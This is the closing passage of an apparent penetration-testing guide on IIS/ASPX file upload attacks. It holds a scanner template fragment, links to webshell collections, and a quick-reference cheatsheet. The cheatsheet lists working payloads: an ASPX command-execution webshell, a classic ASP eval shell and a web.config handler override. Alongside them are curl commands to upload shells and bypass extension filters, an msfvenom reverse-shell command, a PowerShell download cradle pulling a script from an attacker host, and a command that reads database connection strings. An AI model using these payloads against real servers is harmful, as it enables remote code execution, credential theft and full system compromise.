        - "{{BaseURL}}/Telerik.Web.UI.WebResource.axd?type=rau"

      stop-at-first-match: false
      matchers-condition: or
      matchers:
        - type: status
          status: [200, 301, 302, 401, 403, 405]
        - type: word
          words:
            - "upload"
            - "file"
            - "multipart"
            - "enctype"
            - "X-AspNet-Version"
          condition: or
  ```
  :::
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Unrestricted File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP comprehensive guide covering file upload attacks including IIS/ASPX-specific exploitation techniques and defense strategies.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — IIS File Upload
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html
  target: _blank
  ---
  Extensive cheatsheet covering IIS exploitation, web.config abuse, ASPX shell upload, WebDAV attacks, and IIS-specific bypass techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — ASPX Webshells
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  target: _blank
  ---
  Community-maintained repository with ASPX webshell payloads, IIS extension lists, web.config handler overrides, and bypass techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Microsoft IIS Handler Mapping Documentation
  to: https://learn.microsoft.com/en-us/iis/configuration/system.webserver/handlers/
  target: _blank
  ---
  Official Microsoft documentation on IIS handler mappings explaining how file extensions are mapped to processing handlers.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: IIS Tilde Enumeration / Short Name Scanner
  to: https://github.com/irsdl/IIS-ShortName-Scanner
  target: _blank
  ---
  Tool for discovering IIS short filenames (8.3 format) which can reveal uploaded file names and bypass long filename validation.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — File Upload Vulnerabilities
  to: https://portswigger.net/web-security/file-upload
  target: _blank
  ---
  Interactive labs covering file upload bypasses including IIS-specific scenarios with step-by-step solutions.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: ASPX Webshell Collection — tennc
  to: https://github.com/tennc/webshell/tree/master/aspx
  target: _blank
  ---
  Curated collection of ASPX webshells with various features including file managers, command execution, and database tools.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackerOne — IIS/ASPX Disclosed Reports
  to: https://hackerone.com/hacktivity?querystring=aspx%20upload
  target: _blank
  ---
  Real-world disclosed bug bounty reports demonstrating ASPX webshell upload attacks on production IIS applications.
  :::
::

---

## Quick Reference Cheatsheet

::field-group
  :::field{name="Minimal ASPX shell" type="payload"}
  `<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>`
  :::

  :::field{name="Classic ASP shell" type="payload"}
  `<%eval request("cmd")%>`
  :::

  :::field{name="web.config handler override" type="payload"}
  `<handlers><add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"/></handlers>`
  :::

  :::field{name="Upload ASPX shell" type="command"}
  `curl -X POST https://target.com/upload -F "file=@shell.aspx;type=image/jpeg" -H "Cookie: session=TOKEN"`
  :::

  :::field{name="Verify execution" type="command"}
  `curl -s "https://target.com/uploads/shell.aspx?cmd=whoami"`
  :::

  :::field{name="IIS semicolon bypass" type="command"}
  `curl -X POST https://target.com/upload -F "file=@shell.aspx;filename=shell.aspx;.jpg"`
  :::

  :::field{name="NTFS ADS bypass" type="command"}
  `curl -X POST https://target.com/upload -F "file=@shell.aspx;filename=shell.aspx:::\$DATA"`
  :::

  :::field{name="Upload web.config" type="command"}
  `curl -X POST https://target.com/upload -F "file=@web.config;filename=web.config;type=text/xml"`
  :::

  :::field{name="Msfvenom ASPX payload" type="command"}
  `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx`
  :::

  :::field{name="PowerShell reverse shell" type="command"}
  `curl -s "SHELL_URL" --data-urlencode "cmd=powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/rev.ps1')\""`
  :::

  :::field{name="Extract connection strings" type="command"}
  `curl -s "SHELL_URL" --data-urlencode "cmd=type C:\\inetpub\\wwwroot\\web.config | findstr connectionString"`
  :::

  :::field{name="Detect IIS version" type="command"}
  `curl -sI https://target.com | grep -iE "server:|x-powered-by:|x-aspnet"`
  :::
::